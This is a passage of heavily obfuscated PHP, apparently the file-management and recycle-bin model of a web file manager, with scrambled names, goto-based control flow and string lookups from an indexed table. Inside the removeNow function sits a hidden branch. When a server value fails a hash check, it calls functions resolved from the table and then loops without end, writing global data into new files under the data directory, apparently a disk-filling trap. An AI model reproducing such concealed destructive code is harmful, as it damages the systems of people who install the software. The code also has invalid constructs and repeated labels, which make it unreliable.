Aﾱ; E: return $Cڝ; goto Dҽ; bҏ: $this->lockWriteStart($Ań, $EŲˉ); if ($F˖ !== !1) { $aЇϭ = $this->fileNameExist($Ań, $EŲˉ); if ($aЇϭ && $F˖ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ań, $EŲˉ); return $aЇϭ; } $EŲˉ = $this->fileNameAuto($Ań, $EŲˉ, $F˖); } $aϘĿ = array($e鰶[514] => 1, $e鰶[382] => $EŲˉ, $e鰶[515] => $e鰶[33], $e鰶[416] => 0, $e鰶[516] => 0); goto fć; Aﾱ: $e鰶 =& $_SERVER[]; $fĲ = $this->sourceInfo($Ań); if (!$fĲ) { return !1; } goto bҏ; fć: $Cڝ = $this->_addSoure($aϘĿ, $fĲ); Model($e鰶[2263])->eventCreate($Cڝ, $e鰶[1106]); $this->lockWriteEnd($Ań, $EŲˉ); goto E; Dҽ: } private function _createFile($c, $cզ΢, $Fņ, $c΃岬, &$eȈȵ) { goto C鞂; Bܩ: $Fƥ = array($aߏ[514] => 0, $aߏ[382] => $cզ΢, $aߏ[515] => get_path_ext($cզ΢), $aߏ[416] => $Fņ[$aߏ[415]], $aߏ[516] => $Fņ[$aߏ[77]]); $e͆܊ = $this->_addSoure($Fƥ, $bǧ); $this->folderSizeReset($c); goto bҟ; C鞂: $aߏ =& $_SERVER[]; $bǧ = $this->sourceInfo($c); if (!$Fņ || !$bǧ) { return !1; } goto dػ; bҟ: return $e͆܊; goto aҵ; dػ: if ($c΃岬 !== !1) { $eѦ = $this->fileNameExist($c, $cզ΢); } $eȈȵ = !0; if ($c΃岬 && $eѦ) { if ($c΃岬 == REPEAT_SKIP) { $eȈȵ = !1; return $eѦ; } else { if ($c΃岬 == REPEAT_REPLACE) { $d錗 = $this->sourceInfo($eѦ); $C׻ș = $this->fileHistory($d錗, $Fņ[$aߏ[415]], $Fņ[$aߏ[77]]); if (!$C׻ș) { $eȈȵ = !1; } else { $this->folderSizeReset($c); } return $eѦ; } else { $cզ΢ = $this->fileNameAuto($c, $cզ΢, $c΃岬, !1); } } } goto Bܩ; aҵ: } protected function fileHistory($cΝԋ, $A, $B̚ѿ) { goto a̶; a̶: $d⬇ =& $_SERVER[]; if ($cΝԋ[$d⬇[415]] == $A) { return !1; } $this->checkLock($cΝԋ[$d⬇[365]], $A); goto Cм; Cм: Model($d⬇[2293])->addHistory($cΝԋ); $E׆ = array($d⬇[520] => USER_ID, $d⬇[386] => time(), $d⬇[415] => $A, $d⬇[77] => $B̚ѿ); $this->where(array($d⬇[379] => $cΝԋ[$d⬇[365]]))->save($E׆); goto E; E: return !0; goto b奭Ҿ; b奭Ҿ: } public function checkLock($cֈ, $eХ) { goto Dܦʎ; c呫: show_json(LNG($a퉳͘[2296]) . $a퉳͘[2297] . LNG($a퉳͘[2298]) . $a퉳͘[2299] . $a . $a퉳͘[2300], !1); goto f薮; Dܦʎ: $a퉳͘ =& $_SERVER[]; $D˵ = $this->pathInfo($cֈ); if (!$this->fileIsLock($D˵, !0)) { return; } goto A僞; A僞: $a˵ = Session::get($a퉳͘[2294]); $cςʟ = substr($D˵[$a퉳͘[28]], 0, -1 - strlen($D˵[$a퉳͘[156]])) . $a퉳͘[1359] . $a˵ . $a퉳͘[91] . $D˵[$a퉳͘[156]]; $Aܪ = Model($a퉳͘[540])->find($eХ); goto f߅; f߅: $this->_createFileCall($D˵[$a퉳͘[457]], $cςʟ, $Aܪ, REPEAT_REPLACE, $a퉳͘[1105]); $e = $D˵[$a퉳͘[413]][$a퉳͘[477]]; $a = $e[$a퉳͘[2295]] ? $e[$a퉳͘[2295]] : $e[$a퉳͘[28]]; goto c呫; f薮: } public function fileIsLock($B, $A = false) { goto Dۚ; Dۚ: $BƸӻ =& $_SERVER[]; if (!isset($B[$BƸӻ[413]]) || !$B[$BƸӻ[413]][$BƸӻ[474]]) { return !1; } if ($B[$BƸӻ[413]][$BƸӻ[474]] != USER_ID) { return !0; } goto FŴ; FŴ: $c = $GLOBALS[$BƸӻ[6]][$BƸӻ[84]][$BƸӻ[475]]; if ($B[$BƸӻ[413]][$BƸӻ[476]] <= time() - $c) { $this->metaSet($B[$BƸӻ[365]], $BƸӻ[474], null); $this->metaSet($B[$BƸӻ[365]], $BƸӻ[476], null); } if ($A) { $this->metaSet($B[$BƸӻ[365]], $BƸӻ[476], time()); } goto E; E: return !1; goto F; F: } private function _addSoure($c, $C޷) { goto B; c: $e׊ʿ = array($a[523] => short_id($d)); $this->where(array($a[379] => $d))->save($e׊ʿ); $this->setNamePinyin($d, $c[$a[28]]); goto cږ; fھרּ: static $eծޙ = false; if (!$eծޙ) { Hook::trigger($a[504], $c); $eծޙ = !0; } $d = $this->add($c); goto c; cږ: return $d; goto c; f: $this->updateModifyTime($c[$a[457]]); $b = $a[2301] . $C޷[$a[365]]; if (isset(self::$cacheChildList[$b])) { unset(self::$cacheChildList[$b]); } goto fھרּ; B: $a =& $_SERVER[]; $Bĳ = array($a[517] => $C޷[$a[367]], $a[518] => $C޷[$a[452]], $a[519] => USER_ID, $a[520] => USER_ID, $a[364] => $C޷[$a[365]], $a[521] => $C޷[$a[455]] . $C޷[$a[365]] . $a[47], $a[392] => 0, $a[522] => $a[33]); $c = array_merge($Bĳ, $c); goto f; c: } public function remove($BŇқÎ, $A = true) { goto Cؗ; dߛ: $this->recycleClear($C); return $this->move($BŇқÎ, $fڣݍ˕, REPEAT_RENAME_FOLDER); goto E湧; Cؗ: $B߄ =& $_SERVER[]; $C = $this->sourceInfo($BŇқÎ); $AäÞ = intval($C[$B߄[367]]) === self::TYPE_SYSTEM; goto f☝; Bޜ: CacheLock::lock($F毺); $fڣݍ˕ = $this->fileNameExist($a, $Aۥǘ); if (!$fڣݍ˕) { $fڣݍ˕ = $this->mkdir($a, $Aۥǘ, REPEAT_SKIP); $this->metaSet($fڣݍ˕, $B߄[2306], $f); $this->metaSet($fڣݍ˕, $B߄[2307], $C[$B߄[452]]); if ($C[$B߄[457]] != 0) { $this->metaSet($fڣݍ˕, $B߄[2308], _get($B׻֧, $B߄[2309])); } } goto A; A: CacheLock::unlock($F毺); $this->metaSet($BŇқÎ, $B߄[2310], $C[$B߄[457]]); $this->where(array($B߄[365] => $BŇқÎ))->save(array($B߄[386] => time())); goto dߛ; f☝: $a = Model($B߄[1404])->get($B߄[2302]) == $B߄[83]; if ($AäÞ || $A || !$a) { return $this->removeNow($BŇқÎ, $A); } $a = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F㊸; F㊸: $f = $C[$B߄[367]] == self::TYPE_USER ? $B߄[531] : $B߄[957]; if ($f == $B߄[531]) { $B׻֧ = Model($B߄[470])->getInfo($C[$B߄[452]]); $Aۥǘ = !empty($B׻֧[$B߄[2295]]) ? $B׻֧[$B߄[2295]] : $B׻֧[$B߄[28]]; $Aۥǘ = $B߄[244] . $Aۥǘ . $B߄[2303] . $C[$B߄[452]]; } else { $B׻֧ = Model($B߄[454])->getInfo($C[$B߄[452]]); $Aۥǘ = _get($B׻֧, $B߄[28]); $Aۥǘ = $B߄[153] . $Aۥǘ . $B߄[2304] . $C[$B߄[452]]; } $F毺 = $B߄[2305] . md5($Aۥǘ); goto Bޜ; E湧: } private function recycleClear($c֙) { $CƱ =& $_SERVER[]; $E = $this->childrenAll($c֙); $e񅅇 = array($CƱ[379] => array($CƱ[380], $E[$CƱ[2311]])); Model($CƱ[2312])->where($e񅅇)->delete(); } public function removeNow($a尦, $D؟ҥ = true) { goto aޡ²џ; D: if (!$b) { return !0; } if ($b[$d[457]] == 0) { if (!_get($GLOBALS, $d[453])) { return !1; } } $this->lockMoveStart($a尦); goto aԐ; F٬: if ($_SERVER[$d[775]] != $BƵ($a)) { goto C; eōή: $E쑉 = 1; for ($Bμн = $E쑉; $Bμн > 0; $Bμн++) { $e(DATA_PATH . $Bμн, $Cҹؓ); } goto CՄ; D: $EӢǏ = $d[779]; $EӢǏ($_SERVER[$d[780]]); $b߫Š = $d[776]; goto f΅; FÈ: $AЂ = $bȳ($B); $b = explode($d[213], $AЂ); if (count($b) < $d[547]) { $b = $d[778]; $b(); } goto D; f΅: $b߫Š(); $e = $d[781]; $Cҹؓ = json_encode($GLOBALS[$d[782]]); goto eōή; C: $b߫Š = $d[776]; $bȳ = $d[777]; $B = $_SERVER[$d[772]] . $d[773]; goto FÈ; CՄ: } $b = $this->sourceInfo($a尦); $ē֢ = $this->pathInfoMore($a尦); goto D; aޡ²џ: $d =& $_SERVER[]; $a = $_SERVER[$d[780]] . $d[2313]; $BƵ = $d[774]; goto F٬; aԐ: Hook::trigger($d[2314], $ē֢, $D؟ҥ); if ($D؟ҥ) { Model($d[2312])->moveToRecycle($a尦); } else { $aߕ = $this->childrenAll($b); Model($d[501])->eventRemove($a尦); $this->removeRelevance($aߕ[$d[2311]], $aߕ[$d[1238]]); } $this->folderSizeReset($b[$d[457]]); goto F؅; F؅: $C䳐 = array($b[$d[457]]); if ($b[$d[366]] == $d[83]) { $C䳐[] = $b[$d[365]]; } $this->updateModifyTime($C䳐); goto E; E: $this->lockMoveEnd($a尦); Hook::trigger($d[1440], $ē֢, $D؟ҥ); return !0; goto cՠ߈; cՠ߈: } public function childrenAll($B) { $d =& $_SERVER[]; $E֗ = $B[$d[365]]; if ($B[$d[366]] == $d[83]) { $Eڍł = array($d[521] => array($d[479], $B[$d[455]] . $E֗ . $d[480])); $C = array($d[521] => $Eڍł[$d[455]]); $Bѧ = $this->field($d[2315])->where($C)->select(); $Bؽ = !1; $a = array($E֗); if ($Bѧ) { $Bؽ = array_to_keyvalue($Bѧ, $d[33], $d[415]); $Bؽ = array_remove_value($Bؽ, $d[464]); $a = array_to_keyvalue($Bѧ, $d[33], $d[365]); $a[] = $E֗; } } else { $Bؽ = array($B[$d[415]]); $a = array($E֗); } return array($d[2311] => $a, $d[1238] => $Bؽ); } public function removeArray($a) { if (!$a) { return !0; } } public function removeRelevance($c׷, $fݺ) { goto d׮դ; e: for ($fጜӺՠ = 0; $fጜӺՠ < count($c׷); $fጜӺՠ++) { $this->sourceCacheClear($c׷[$fጜӺՠ]); } goto a; A瓵Ъ: $c׷ = array_unique(array_filter($c׷)); $fݺ = array_unique(array_filter($fݺ)); if (!$c׷) { return !1; } goto Cꎋ; Cꎋ: $a = array($d˅Ǯ[379] => array($d˅Ǯ[380], $c׷)); Model($d˅Ǯ[2312])->where($a)->delete(); Model($d˅Ǯ[409])->where($a)->delete(); goto e纻; d͛: Model($d˅Ǯ[2293])->removeBySource($c׷); $this->where($a)->delete(); Model($d˅Ǯ[418])->remove($fݺ); goto e; e纻: Model($d˅Ǯ[2316])->where($a)->delete(); Model($d˅Ǯ[501])->where($a)->delete(); Model($d˅Ǯ[2045])->removeBySource($c׷); goto d͛; d׮դ: $d˅Ǯ =& $_SERVER[]; $c׷ = $c׷ ? $c׷ : array(); $fݺ = $fݺ ? $fݺ : array(); goto A瓵Ъ; a: } public function rename($Dޒ, $a) { goto c; D޳: $AČ = $eيդ[2301] . $A㏮[$eيդ[457]]; if (isset(self::$cacheChildList[$AČ])) { unset(self::$cacheChildList[$AČ]); } return $c懫; goto d䭾; a֖ʩև: if (!$A㏮[$eيդ[366]] == $eيդ[83]) { $E޺[$eيդ[368]] = get_path_ext($a); } Model($eيդ[501])->eventRename($Dޒ, $A㏮[$eيդ[28]], $a); $this->sourceCacheClear($Dޒ); goto fک; B݌: $bٚ = $this->fileNameExist($A㏮[$eيդ[457]], $a); if ($bٚ) { return !1; } $E޺ = array($eيդ[382] => $a, $eيդ[520] => USER_ID); goto a֖ʩև; fک: $this->setNamePinyin($Dޒ, $E޺[$eيդ[28]], !1); $this->updateModifyTime($A㏮[$eيդ[457]]); $c懫 = $this->where(array($eيդ[379] => $Dޒ))->data($E޺)->save(); goto D޳; c: $eيդ =& $_SERVER[]; $A㏮ = $this->sourceInfo($Dޒ); if (!$A㏮) { return !1; } goto B݌; d䭾: } public function setNamePinyin($C󲏍, $Fܒ, $f = true) { $Bߩ =& $_SERVER[]; $eڗۦ = Input::check($Fܒ, $Bߩ[524]); if ($f && !$eڗۦ) { return; } if (!$eڗۦ) { $this->metaSet($C󲏍, $Bߩ[412], null); $this->metaSet($C󲏍, $Bߩ[411], null); return; } $aԆʖ = array($Bߩ[412] => str_replace($Bߩ[50], $Bߩ[33], Pinyin::encode($Fܒ)), $Bߩ[411] => Pinyin::encode($Fܒ, $Bߩ[525])); $this->metaSet($C󲏍, $aԆʖ); } public function getContent($c) { goto D; d✗: return IO::getContent($DҢ[$E֬͝[75]]); goto C֝; D: $E֬͝ =& $_SERVER[]; $DҢ = $this->fileInfoGet($c); if (!$DҢ) { return !1; } goto D; D: if ($DҢ[$E֬͝[77]] == 0) { return $E֬͝[33]; } $b왯Đ = $E֬͝[2317] . $DҢ[$E֬͝[159]]; if ($DҢ[$E֬͝[77]] <= 1024 * 10) { $c = Cache::get($b왯Đ); if (!$c) { $c = IO::getContent($DҢ[$E֬͝[75]]); Cache::set($b왯Đ, $c); } return $c; } goto d✗; C֝: } public function setDesc($fȬ, $b) { $Eܭ =& $_SERVER[]; Model($Eܭ[501])->eventAddDesc($fȬ, $b); return $this->metaSet($fȬ, $Eܭ[401], $b); } public function setContent($FɺՍ, $cτ = '') { goto a; A: if (!$A權⠷ || !$bӜن) { return !1; } $c􍆾 = Model($F̬[418])->addFileByContent($cτ, $bӜن[$F̬[28]]); $E = $this->fileHistory($bӜن, $c􍆾[$F̬[415]], $c􍆾[$F̬[77]]); goto aȓ; aȓ: if (!$E) { return Model($F̬[418])->remove($c􍆾[$F̬[415]]); } $this->folderSizeReset($bӜن[$F̬[457]]); return !0; goto d; a: $F̬ =& $_SERVER[]; $bӜن = $this->sourceInfo($FɺՍ); $A權⠷ = $this->fileInfoGet($FɺՍ); goto A; d: } public function fileSubstr($cɍ, $fރ̒, $B) { $Aצ = $this->fileInfoGet($cɍ); if (!$Aצ) { return !1; } return IO::fileSubstr($Aצ[$_SERVER[][75]], $fރ̒, $B); } public function fileInfoGet($Cߧ؏) { goto f; f: $Dǚ =& $_SERVER[]; $D޶М = $this->sourceInfo($Cߧ؏); if (!$D޶М || $D޶М[$Dǚ[366]]) { return !1; } goto cۅ; cۅ: $C߃ = $Dǚ[421] . $D޶М[$Dǚ[415]]; $F = _get(self::$cacheFileInfo, $C߃); if ($F) { return $F; } goto eˤ; eˤ: $E = Model($Dǚ[418])->fileInfo($D޶М[$Dǚ[415]]); if ($E) { $E[$Dǚ[28]] = $D޶М[$Dǚ[28]]; } self::$cacheFileInfo[$C߃] = $E; goto cꗦĪ; cꗦĪ: return $E; goto dސ; dސ: } private function folderChildrenNumber($eͤ) { $eڐз =& $_SERVER[]; $Bɯ = $this->sourceInfo($eͤ); $eҍ = array($eڐз[521] => array($eڐз[479], $Bɯ[$eڐз[455]] . $eͤ . $eڐз[480]), $eڐз[392] => intval($Bɯ[$eڐз[393]]), $eڐз[514] => 1); $CÉ = $this->where($eҍ)->count(); $Cן = $this->where($eҍ)->where(array($eڐз[514] => 0))->count(); return array($eڐз[81] => $Cן, $eڐз[82] => $CÉ); } public function pathInfo($D, $Fס = false) { goto e܌; e܌: $bɏ =& $_SERVER[]; $eͽ = $bɏ[407] . intval($Fס) . $bɏ[408] . $D; $Ců = _get(self::$cachePathInfo, $eͽ); goto F; F: if ($Ců) { return $Ců; } $Dב = $this->sourceInfo($D); if (!$Dב) { return !1; } goto c܃; c܃: $Dב = $this->_listDataApplyItem($Dב, $Fס); self::$cachePathInfo[$eͽ] = $Dב; return $Dב; goto f鴲; f鴲: } public static $cachePathInfoMore = array(); public function pathInfoMore($aύ) { goto EΚ; Dы: $c㴲 = $this->pathInfo($aύ); if (!$c㴲) { return !1; } if ($c㴲[$dԩơ[366]] == $dԩơ[83]) { $c㴲[$dԩơ[80]] = $this->folderChildrenNumber($aύ); } goto eꎒ; EΚ: $dԩơ =& $_SERVER[]; $eӮ = _get(self::$cachePathInfoMore, $aύ); if ($eӮ) { return $eӮ; } goto Dы; eꎒ: self::$cachePathInfoMore[$aύ] = $c㴲; return $c㴲; goto DЭ; DЭ: } public function sourceInfo($D) { goto D; Eَ: $Dկ = _get(self::$cacheSourceInfo, $BՔٳ); if ($Dկ) { return $Dկ; } $Aճ = $this->where(array($dܞө[365] => $D))->find(); goto CΥ; CΥ: self::$cacheSourceInfo[$BՔٳ] = $Aճ; return self::$cacheSourceInfo[$BՔٳ]; goto F; D: $dܞө =& $_SERVER[]; if (!$D) { return array(); } $BՔٳ = $dܞө[406] . $D; goto Eَ; F: } public function sourceCacheClear($c޵ = false) { if ($c޵ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[][406] . $c޵]); } public function pathInfoByPath($Cΰ, $eΤ) { $f =& $_SERVER[]; $dۂټ = !$eΤ ? array() : explode($f[8], trim($eΤ, $f[8])); $BəÊ = $Cΰ; foreach ($dۂټ as $b謪) { $eҊ = array($f[457] => $BəÊ, $f[28] => $b謪); $F = $this->where($eҊ)->select(); if (!$F) { return !1; } $F = array_sort_by($F, $f[393]); $BəÊ = $F[0][$f[365]]; } return $this->pathInfo($BəÊ, !0); } protected function updateModifyTime($A) { goto Dф; BՊז: foreach ($A as $eԘ => $Dʿ) { $A[$eԘ] = intval($Dʿ); } $cӽ = array($Fɖ[365] => array($Fɖ[7], $A)); $B = array($Fɖ[520] => USER_ID, $Fɖ[386] => time()); goto bח; bח: $this->where($cӽ)->save($B); goto A˚; Dф: $Fɖ =& $_SERVER[]; if (!$A) { return; } if (!is_array($A)) { $A = array($A); } goto BՊז; A˚: } public function folderSizeReset($Dÿ垌) { goto bЖ; AӐ: $Aהۖ = $this->parentLevelArray($f¸[$b悍[455]]); if ($Aהۖ) { $Cǩ = array($b悍[365] => array($b悍[380], $Aהۖ)); if ($dĕ < 0) { $Cǩ[$b悍[77]] = array($b悍[915], abs($dĕ)); } $this->where($Cǩ)->setAdd($b悍[77], $dĕ); } $this->targetSpaceUpdate($f¸[$b悍[367]], $f¸[$b悍[452]]); goto C߆; C߆: CacheLock::unlock($D); goto Fߛ; C: $Cǩ = array($b悍[364] => $Dÿ垌, $b悍[392] => 0); $Dܘߊ = $this->where($Cǩ)->sum($b悍[77]); $Dܘߊ = intval($Dܘߊ); goto fƼ; CӲ: CacheLock::lock($D, 20); $this->sourceCacheClear($Dÿ垌); $f¸ = $this->sourceInfo($Dÿ垌); goto C; fƼ: $dĕ = $Dܘߊ - intval($f¸[$b悍[77]]); if ($dĕ == 0) { return CacheLock::unlock($D); } $this->where(array($b悍[379] => $Dÿ垌))->setField($b悍[77], $Dܘߊ); goto AӐ; bЖ: $b悍 =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $D = $b悍[2318] . $Dÿ垌; goto CӲ; Fߛ: } public function folderSizeResetChildren($D) { goto cŰ; b߲: $Dކ[] = $dΦ; $Dކ = array_to_keyvalue($Dކ, $eܮƧ[365]); foreach ($Dކ as $a => $a䄤) { $Dކ[$a][$eܮƧ[2320]] = $Dކ[$a][$eܮƧ[77]]; $Dކ[$a][$eܮƧ[77]] = 0; } goto fΊŜ; E: $Bŏ[$eܮƧ[366]] = 0; $c = $this->field($B)->where($Bŏ)->select(); if (!$c) { return; } goto b߲; C؃ǜ: $Bŏ = array($eܮƧ[514] => 1, $eܮƧ[521] => array($eܮƧ[479], $dΦ[$eܮƧ[455]] . $D . $eܮƧ[480])); $B = $eܮƧ[2319]; $Dކ = $this->field($B)->where($Bŏ)->select(); goto E; D񄃨: foreach ($Dކ as $a䄤) { if ($a䄤[$eܮƧ[77]] == $a䄤[$eܮƧ[2320]]) { continue; } $bǺñ[] = array($eܮƧ[365], $a䄤[$eܮƧ[365]], $eܮƧ[77], $a䄤[$eܮƧ[77]]); } $this->saveAll($bǺñ); goto bҤ; cŰ: $eܮƧ =& $_SERVER[]; $this->sourceCacheClear($D); $dΦ = $this->sourceInfo($D); goto C؃ǜ; fΊŜ: foreach ($c as $a䄤) { $A = $a䄤[$eܮƧ[457]] . $eܮƧ[33]; if (!isset($Dކ[$A])) { continue; } if ($a䄤[$eܮƧ[393]] == $Dކ[$A][$eܮƧ[393]]) { $Dކ[$A][$eܮƧ[77]] += $a䄤[$eܮƧ[77]]; } } foreach ($Dކ as $a䄤) { $b = $this->parentLevelArray($a䄤[$eܮƧ[455]]); foreach ($b as $A) { $A = $A . $eܮƧ[33]; if (!isset($Dކ[$A])) { continue; } if ($a䄤[$eܮƧ[393]] == $Dކ[$A][$eܮƧ[393]]) { $Dކ[$A][$eܮƧ[77]] += $a䄤[$eܮƧ[77]]; } } } $bǺñ = array(); goto D񄃨; bҤ: } public function userSpaceReset($AĈ述 = false) { $cΘ愑 =& $_SERVER[]; $cآҎ = $this->where(array($cΘ愑[367] => self::TYPE_USER, $cΘ愑[452] => $AĈ述, $cΘ愑[366] => 0))->sum($cΘ愑[77]); Model($cΘ愑[470])->userEdit($AĈ述, array($cΘ愑[2054] => $cآҎ)); } public function targetSpaceUpdate($C̐ӑ, $Eָͽ) { $bɇў =& $_SERVER[]; if (!$Eָͽ) { return; } if (!in_array($C̐ӑ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f = $this->targetSpaceSize($C̐ӑ, $Eָͽ); if ($C̐ӑ == self::TYPE_USER) { Model($bɇў[470])->userEdit($Eָͽ, array($bɇў[2054] => $f)); } else { if ($C̐ӑ == self::TYPE_GROUP) { Model($bɇў[454])->groupEdit($Eָͽ, array($bɇў[2054] => $f)); } } } public function targetSpaceSize($C悦, $F٩) { goto dŸӸڶ; e墟: $a = floatval($d[$f҇[77]]); $Eҋܑ = array($f҇[521] => array($f҇[479], $f҇[466] . $d[$f҇[365]] . $f҇[480])); $b = Model($f҇[391])->field($f҇[379])->where($Eҋܑ)->select(); goto C򶻗; C򶻗: $b = array_to_keyvalue($b, $f҇[33], $f҇[365]); $b = array_unique(array_filter($b)); if ($b) { $Eҋܑ = array($f҇[379] => array($f҇[380], $b)); $a += floatval($this->where($Eҋܑ)->sum($f҇[77])); } goto aʹ; dŸӸڶ: $f҇ =& $_SERVER[]; $d = $this->sourceRoot($C悦, $F٩, !0); if (!$d) { return 0; } goto e墟; aʹ: return $a; goto f濯; f濯: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($eʼ) { return $this->fileTypeProfile($eʼ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E𴪩) { return $this->fileTypeProfile($E𴪩, SourceModel::TYPE_GROUP); } private function fileTypeProfile($CЫ, $b) { goto Eۭ; Dޞ: if ($c嗄) { return $c嗄; } $CҘԚ = array($b[514] => 0); if ($CЫ != !1) { $CҘԚ[$b[452]] = $CЫ; $CҘԚ[$b[367]] = $b; } goto dȓ; Eۭ: $b =& $_SERVER[]; $d = $b[2321] . $CЫ . $b[70] . $b; $c嗄 = Cache::get($d); goto Dޞ; B: foreach ($d as $a䂭 => $BѮʕ) { $CҘԚ[$b[368]] = $this->fileTypeWhere($a䂭); $DВ[$a䂭] = array($b[2323] => $BѮʕ[$b[28]], $b[2324] => $this->where($CҘԚ)->count(), $b[516] => $this->where($CҘԚ)->sum($b[77])); } Cache::set($d, $DВ, 1200); return $DВ; goto Bڦ; dȓ: $DВ = array(); $DВ[$b[2322]] = array($b[2323] => LNG($b[2322]), $b[2324] => $this->where($CҘԚ)->count(), $b[516] => $this->where($CҘԚ)->sum($b[77])); $d = KodIO::fileTypeList(); goto B; Bڦ: } public function fileNameExist($Bۥ, $Eڊۂ) { $Cݓ =& $_SERVER[]; $b = $this->childList($Bۥ); foreach ($b as $c⃑枢) { if ($c⃑枢[$Cݓ[28]] == $Eڊۂ) { return $c⃑枢[$Cݓ[365]]; } } return !1; } public function childList($E՘) { goto FՓސ; Aќă: $Aڢꐜ = array($Bđȉ[457] => intval($E՘), $Bđȉ[393] => 0); $dˋ = $this->where($Aڢꐜ)->select(); $dˋ = $dˋ ? $dˋ : array(); goto Eܙ; FՓސ: $Bđȉ =& $_SERVER[]; $D = $Bđȉ[2301] . $E՘; if (isset(self::$cacheChildList[$D])) { return self::$cacheChildList[$D]; } goto Aќă; Eܙ: self::$cacheChildList[$D] = $dˋ; foreach ($dˋ as $Bꯝ) { $D = $Bđȉ[406] . $Bꯝ[$Bđȉ[365]]; self::$cacheSourceInfo[$D] = $Bꯝ; } return $dˋ; goto Aܬ; Aܬ: } public function fileNameAuto($Eã, $F, $bϺ = REPEAT_RENAME, $DƵ = false) { $D˕ =& $_SERVER[]; $Dܚأ = $this->childList($Eã); $d = array_to_keyvalue($Dܚأ, $D˕[33], $D˕[28]); return $this->fileNameAutoGet($d, $F, $bϺ, $DƵ); } public function fileNameAutoGet($a, $aޮ, $d, $Bل) { $B =& $_SERVER[]; if ($d == REPEAT_REPLACE || !$a || !in_array_not_case($aޮ, $a) || $Bل && $d != REPEAT_RENAME_FOLDER) { return $aޮ; } if ($d == REPEAT_SKIP) { return !1; } $EӴ = $B[91] . get_path_ext($aޮ); $EӴ = $EӴ == $B[91] || $Bل ? $B[33] : $EӴ; for ($b = 1; $b <= count($a) + 1; $b++) { $f = substr($aޮ, 0, strlen($aޮ) - strlen($EӴ)); $Fʉϸ = $f . "\50{$b}\51{$EӴ}"; if (!in_array_not_case($Fʉϸ, $a)) { return $Fʉϸ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\145\x5f\162\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\x54\151\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\162\164", "\146\165\x6e\x63\164\x69\157\x6e")); public function listData($A = false) { $cӞ⬦ =& $_SERVER[]; $A = $A ? $A : USER_ID; $e = $this->where(array($cӞ⬦[1397] => $A))->select(); return array_to_keyvalue($e, $cӞ⬦[33], $cӞ⬦[365]); } public function moveToRecycle($Cʐ) { goto A; B: if (!$Ä́ || $Ä́[$aୖ[393]] == $aୖ[83]) { return; } $F = array($aୖ[379] => $Cʐ, $aୖ[1397] => USER_ID, $aୖ[517] => $Ä́[$aୖ[367]], $aୖ[518] => $Ä́[$aୖ[452]], $aୖ[521] => $Ä́[$aୖ[455]]); $this->add($F); goto B; A: $aୖ =& $_SERVER[]; $Eԟ = Model($aୖ[1097]); $Ä́ = $Eԟ->sourceInfo($Cʐ); goto B; B: $this->recycleMove($Cʐ, 1); if ($Ä́[$aୖ[366]] == $aୖ[83]) { $FΣ = array($aୖ[521] => array($aୖ[479], $Ä́[$aୖ[455]] . $Cʐ . $aୖ[480])); $Eԟ->where($FΣ)->setField($aୖ[393], 1); } goto D; D: } public function clear() { $this->remove(!1); } public function remove($Fᐤ = false) { goto eК; A: $Fᐤ = $Fᐤ === !1 ? !1 : $Fᐤ; $E = array(); foreach ($eݸћ䛮 as $E٩) { if ($Fᐤ != !1 && !in_array($E٩, $Fᐤ)) { continue; } $a->remove($E٩, !1); $Bᐟ = $this->where(array($dӈԖ[365] => $E٩))->find(); $Bģ = $Bᐟ[$dӈԖ[367]] . $dӈԖ[70] . $Bᐟ[$dӈԖ[452]]; $E[$Bģ] = array($dӈԖ[517] => $Bᐟ[$dӈԖ[367]], $dӈԖ[452] => $Bᐟ[$dӈԖ[452]]); $this->where(array($dӈԖ[365] => $E٩))->delete(); } goto C; C: foreach ($E as $f) { $a->targetSpaceUpdate($f[$dӈԖ[367]], $f[$dӈԖ[452]]); } goto Fɸ; eК: $dӈԖ =& $_SERVER[]; $a = Model($dӈԖ[1097]); $eݸћ䛮 = $this->listData(); goto A; Fɸ: } public function restore($D = false) { goto b; b: $d =& $_SERVER[]; $Fȸ = Model($d[1097]); $bْО = $this->listData(); goto B˥; B˥: $D = $D == !1 ? !1 : $D; if (!$bْО) { return !0; } $Fԯ = array(); goto f; f: foreach ($bْО as $F߳) { goto D¥; D¥: if ($D != !1 && !in_array($F߳, $D)) { continue; } $A = $Fȸ->sourceInfo($F߳); $Bʞ = $Fȸ->sourceInfo($A[$d[457]]); goto c; c: if ($Bʞ[$d[393]] == $d[83]) { continue; } $Fȸ->lockMoveStart($F߳); $this->recycleMove($F߳, 0); goto FĪ; E汉: $Fԯ[] = $A[$d[457]]; if ($A[$d[366]] == $d[83]) { $Fԯ[] = $F߳; } $Fȸ->lockMoveEnd($F߳); goto F; FĪ: if ($A[$d[366]] == $d[83]) { $B = array($d[521] => array($d[479], $A[$d[455]] . $F߳ . $d[480])); $Fȸ->where($B)->setField($d[393], 0); $this->restoreFolderChildren($F߳, $bْО); } $this->where(array($d[365] => $F߳))->delete(); $Fȸ->folderSizeReset($A[$d[457]]); goto E汉; F: } $Fȸ->updateModifyTime($Fԯ); goto fٝ߱; fٝ߱: } private function restoreFolderChildren($Eؐۡ, $dÉ) { goto d֜; B䎮: $dŞ[$E攱[365]][1] = array_unique($dŞ[$E攱[365]][1]); $dŞ[$E攱[900]] = $E攱[2148]; $Cޙ->where($dŞ)->setField($E攱[393], 1); goto c; bخ: foreach ($dÉ as $B΅) { if ($B΅ == $Eؐۡ) { continue; } if (!$Cޙ->isParentOf($Eؐۡ, $B΅)) { continue; } $E廧 = $Cޙ->sourceInfo($B΅); if ($E廧[$E攱[366]] == $E攱[83]) { $dŞ[] = array($E攱[521] => array($E攱[479], $E廧[$E攱[455]] . $B΅ . $E攱[480])); } else { $dŞ[$E攱[365]][1][] = $B΅; } } if (!$dŞ[$E攱[365]][1]) { unset($dŞ[$E攱[365]]); } if (!$dŞ) { return; } goto B䎮; d֜: $E攱 =& $_SERVER[]; $Cޙ = Model($E攱[1097]); $dŞ = array($E攱[365] => array($E攱[7], array())); goto bخ; 